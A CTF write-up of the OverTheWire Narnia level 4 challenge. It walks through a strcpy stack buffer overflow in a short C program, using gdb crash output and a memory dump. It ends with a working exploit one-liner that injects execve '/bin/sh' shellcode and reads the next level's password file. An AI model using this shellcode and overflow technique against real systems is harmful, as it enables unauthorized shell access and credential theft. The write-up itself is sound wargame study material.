---
layout:     post
title:      "Overthewire.org - Narnia 4 -> 5"
subtitle:   "Write-Up"
date:       2017-03-09 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
category: Overthewire
---

<h1>Introduction</h1>

<p>Today we'll be dealing with another reverse engineering challenge from Overthewire - pretty quick, but fun as always!  </p>

<h1>Challenge</h1>

<p>This code is a lot shorter, compared to the previous ones, making it much easier to analyze. </p>

{% highlight c %}
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}

{% endhighlight %}

<p>Yeah, we have a buffer of 256 bytes, which gets the content, using dangerous <b>strcpy</b> function straight from the argument variable. This challenge looks a lot like the second one, so maybe we will also be able to put shellcode somewhere in the buffer? </p>

<p>Actually, after a little bit of tinktering in <b>gdb</b>, I've found that providing the binary with 273 "A" letters and 7 "B" letters will overwrite our buffer, together with return address.  </p>

{% highlight bash %}
(gdb) run $(python -c 'print "A" * 272 + "BBBBBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia4 $(python -c 'print "A" * 272 + "BBBBBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
{% endhighlight %}

<p>Now let's take a look at the memory. </p>

{% highlight text %}
0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
---Type <return> to continue, or q <return> to quit---
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x41414141  0x41414141  0x42424141  0x42424242
0xffffd8c0: 0x00004242  0x00000000  0x00000000  0x00000000
0xffffd8d0: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd8e0: 0x00000000  0x00000000  0x00000000  0x00000000
{% endhighlight %}

<p>From this we know that I have somewhere around 272 bytes for the shellcode with some additional bytes that will overwrite the return address. Now we can construct the command, using code from the previous levels. </p>

<p>As we know already that our payload is 25 bytes in size, we will have to firstly write 247 "A" letters, then 25 bytes of shellcode and lastly overwriting the <b>EIP register</b>, which then will be placed somewhere in the middle of "A" letters. By looking at the debug of the memory, I'm going to choose it as <b>0xffffd850</b>.  </p>

{% highlight bash %}
narnia4@melinda:/narnia$ ./narnia4 $(python -c'print "A" * 247 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
$ cat /etc/narnia_pass/narnia5
********
{% endhighlight %}

<p>Once again we have the password to the next level! </p>

<h1>Conclusion</h1>
<p>Another big thanks  to <a href="http://overthewire.org/wargames/">OverTheWire</a>! I'm looking forward to the next challenges! </p>


<p>~ Stay safe!</p>
